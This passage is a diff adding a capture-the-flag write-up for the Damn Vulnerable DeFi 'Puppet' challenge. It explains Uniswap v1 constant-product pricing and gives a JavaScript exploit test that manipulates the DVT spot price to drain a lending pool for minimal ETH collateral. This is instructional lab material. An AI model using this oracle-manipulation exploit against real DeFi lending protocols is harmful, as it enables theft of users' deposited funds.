@@ -533,3 +533,77 @@ it('Exploit', async function () {
   await setMedianPrice(priceToSet);
 });
 ```
+
+## 8 - Puppet
+
+Now, this challenge might look math intensive at first, but it's critical to understand these concepts because they are backbone of DEXs that utilize AMMs. Essentially we will solve the challenge with market manipulation. We will take advantage of the low liquidity inside Uniswap DVT pool.
+
+The main contract is **PuppetPool.sol** that we need to drain funds from. In order to get all DVT tokens from pool, we have to strongly devalue DVT token so that required ETH deposit as collateral gets really low. Collateral is calculated based on DVT price that comes from UniSwap contract deployed earlier in the test.
+
+Now, I wrote some comments inside solution script to help you understand what's going on. Long story short, UniSwap exchange for DVT token calculates 'price' of DVT based on ratio supplied in the pool. If there is a lot of DVT and less ETH, ETH becomes very valuable compared to DVT, and vice versa.
+
+The main formula that drives this behaviour is: `X * Y = k`  
+`X` is amount of ERC20 token (**DVT**)  
+`Y` is amount of ETH  
+`k` is the **constant** product, meaning that ratio will change in order to satisfy the product
+
+I encorouge you to do your own research on AMMs and UniSwap v1 for better understanding.
+
+Now, for the solution. Firstly we will deposit all available **DVT** in UniSwap exchange to strongly devalue the price. We will get around **9.9 ETH** for supplied DVT.
+Then, we will be able to borrow 100k DVT from **PuppetPool.sol** with supplying just around 18 ETH as collateral. We can get 1000 DVT back from UniSwap exchange with depositting around 10 ETH.
+
+Solution code:
+
+**puppet.challenge.js**
+
+```js
+it('Exploit', async function () {
+  /** CODE YOUR EXPLOIT HERE */
+  /**
+   * AMM Formula: X * Y = k
+   *
+   * 1 - Devalue DVT by depositing 1000 tokens
+   * 10 ETH : 10 DVT => k = 10 * 10 = 100
+   * X ETH  : 1010 DVT => X = 100 / 1010 = 0.09901
+   * We receive: 10 - 0.09901 = 9.90099 ETH
+   *
+   * 2 - borrow all DVT from the pool
+   * 100000 DVT costs (0.09 / 1010) * 100000 * 2 = 17.8 ETH
+   * We are left off with ~15 ETH + 100000 DVT
+   *
+   * 3 - put uniswap pool to original ratio
+   * We put back 10 ETH which gives us 1000 DVT
+   * Ratio: 10 ETH : 10 DVT
+   */
+  const attackPuppet = this.lendingPool.connect(attacker);
+  const attackToken = this.token.connect(attacker);
+  const attackUniSwap = this.uniswapExchange.connect(attacker);
+
+  await attackToken.approve(
+    attackUniSwap.address,
+    ATTACKER_INITIAL_TOKEN_BALANCE
+  );
+
+  await attackUniSwap.tokenToEthSwapInput(
+    ATTACKER_INITIAL_TOKEN_BALANCE,
+    ethers.utils.parseEther('9'),
+    (await ethers.provider.getBlock('latest')).timestamp * 2
+  );
+
+  const deposit = await attackPuppet.calculateDepositRequired(
+    POOL_INITIAL_TOKEN_BALANCE
+  );
+  await attackPuppet.borrow(POOL_INITIAL_TOKEN_BALANCE, { value: deposit });
+
+  const tokensToBuyBack = ATTACKER_INITIAL_TOKEN_BALANCE;
+  const ethReq = await attackUniSwap.getEthToTokenOutputPrice(tokensToBuyBack, {
+    gasLimit: 1e6,
+  });
+
+  await attackUniSwap.ethToTokenSwapOutput(
+    tokensToBuyBack,
+    (await ethers.provider.getBlock('latest')).timestamp * 2,
+    { value: ethReq }
+  );
+});
+```
